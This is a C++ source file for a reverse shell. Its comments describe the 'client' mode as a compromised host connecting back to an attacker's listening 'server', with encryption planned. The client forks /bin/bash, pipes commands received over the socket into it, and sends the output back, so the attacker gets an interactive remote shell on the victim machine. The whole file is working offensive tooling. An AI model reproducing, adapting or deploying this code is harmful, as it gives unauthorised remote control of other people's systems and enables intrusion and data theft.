

#include "utils.h"
#include "args_parser.h"


// error msgs
std::string pipeFailed = "[!] Pipe creation failed!";
std::string forkFailed = "[!] Fork creation failed!";
std::string execlFailed = "[!] Execl failed!";

// placeholder for now
void server(const std::string &serverIpAddr, unsigned int portNum) {
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET; // define IPV4
    serverAddr.sin_port = htons(portNum); // set port, htons coverts port to byte order
    serverAddr.sin_addr.s_addr = inet_addr(serverIpAddr.c_str()); // listen on any available IP (allow further config?)

    bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr));

    // socket, max number of queued connections

    listen(serverSocket, 5);

    // get info on connecting client
    struct sockaddr_storage clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    char clientIpAddr[INET_ADDRSTRLEN];

    int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);

    struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
    int clientPort = ntohs(s->sin_port); // converts byte to port number
    inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr

    std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;

    char buffer[2048];
    while (true) {

        // placeholder
        std::cout << "[client_hostname] ";

        std::string msgToSend;
        std::getline(std::cin, msgToSend);

        send(clientSocket, msgToSend.c_str(), msgToSend.length(), 0);

        memset(buffer, 0, sizeof(buffer));
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

        if (bytesReceived <= 0) {
            std::cout << "[!] Client Disconnected!" << std::endl;
            break;
        }

        if (std::string(buffer) == "exit") {
            std::cout << "[!] Received exit from Client!" << std::endl;
            break;
        }

        std::cout << buffer << std::endl;
    }

    close(serverSocket);
}


void client(const std::string &ipAddr, unsigned int portNum) {

    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    // socket info
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(portNum);
    serverAddr.sin_addr.s_addr = inet_addr(ipAddr.c_str());
    connect(clientSocket, (struct sockaddr*)&serverAddr,sizeof(serverAddr));
    char socket_buffer[1024];
    std::cout << "[+] Connected to server successfully" << std::endl;

    // pipe info for running /bin/bash
    int to_child[2]; // parent -> child proc
    int from_child[2]; // child -> parent proc

    // try and open pipe
    if (pipe(to_child) == -1 || pipe(from_child) == -1) {
        std::cout << pipeFailed << std::endl;
        //communicate with server pipe failed
        const char *message = pipeFailed.c_str();
        send(clientSocket, message, strlen(message), 0);
        exit(-1); //temp
    }

    pid_t childPid = fork();
    if (childPid == -1) {

        std::cout << forkFailed << std::endl;
        const char *message = forkFailed.c_str();
        send(clientSocket, message, strlen(message), 0);
        exit(-1);
    }

    if (childPid == 0) {
        //child proc
        dup2(to_child[0], STDIN_FILENO);
        dup2(from_child[1], STDOUT_FILENO);
        dup2(from_child[1], STDERR_FILENO);

        close(to_child[1]);
        close(from_child[0]);

        execl("/bin/bash", "bash", NULL);
        std::cout << execlFailed << std::endl;
        const char *message = execlFailed.c_str();
        send(clientSocket, message, strlen(message), 0);
        exit(-1);
    } else {
        //parent proc
        close(to_child[0]);
        close(from_child[1]);

        fcntl(from_child[0], F_SETFL, O_NONBLOCK);

        char pipe_buffer[1024];

        // sending connection request
        while (true){
            memset(socket_buffer, 0, sizeof(socket_buffer));

            int bytesReceived = recv(clientSocket, socket_buffer, sizeof(socket_buffer), 0);

            if (bytesReceived >= 0) {
                //std::cout << "[+] Msg received: " << buffer << std::endl;
            }

            if (std::string(socket_buffer) == "exit") {
                std::cout << "[!] Received exit from Server!" << std::endl;
                break;
            }

            std::string cmdToPipe = std::string(socket_buffer);

            cmdToPipe += "\n";

            write(to_child[1], cmdToPipe.c_str(), cmdToPipe.size());

            usleep(100000); // small delay
            while (true) {
                ssize_t n = read(from_child[0], pipe_buffer, sizeof(pipe_buffer) - 1);
                if (n > 0) {
                    pipe_buffer[n] = '\0';
                    //std::cout << pipe_buffer << sizeof(pipe_buffer) << std::endl; //debug
                } else {
                    break; // No more data for now
                }
            }
            send(clientSocket, pipe_buffer, strlen(pipe_buffer), 0);
        }

        close(to_child[1]);
        close(from_child[0]);
        wait(nullptr);
    }

    // closing socket
    close(clientSocket);
}


int main(int argc, char *argv[]) {


    /*  Program Layout
     *  User passes argument 'client' or 'server'
     *  'client' would be a compromised host attempting to connect back to attacker
     *  'server' would be an attacker waiting for a connection
     *
     *  if 'server' arg passed, we just need one parameter and that's a port number to listen on (default 443)
     *
     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the 'server'
     *
     *  then connect and set up an encrypted rev shell (method undecided)
     */
    struct config cfg = parse_args(argc, argv);

    if (cfg.execType == "server") {
        server(cfg.ipAddr, cfg.portNum);
    }
    else {
        client(cfg.ipAddr, cfg.portNum);
    }

    return 0;
}

